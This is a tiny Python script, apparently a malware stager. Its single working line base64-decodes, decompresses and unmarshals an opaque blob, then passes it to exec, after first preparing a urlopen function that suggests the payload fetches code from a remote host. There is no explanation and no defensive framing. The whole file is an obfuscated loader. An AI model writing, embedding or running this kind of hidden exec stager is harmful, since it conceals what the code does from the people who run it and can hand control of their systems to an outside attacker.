import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwFwTEKwCAMAEB/oy4JxaW49C1CQi2VKEk6+Pve2RVC+HTMxZJid18VcUzl9xEgEgNhr0cpJyKat5vVkPaAtWMG5UYp//onFig=')))))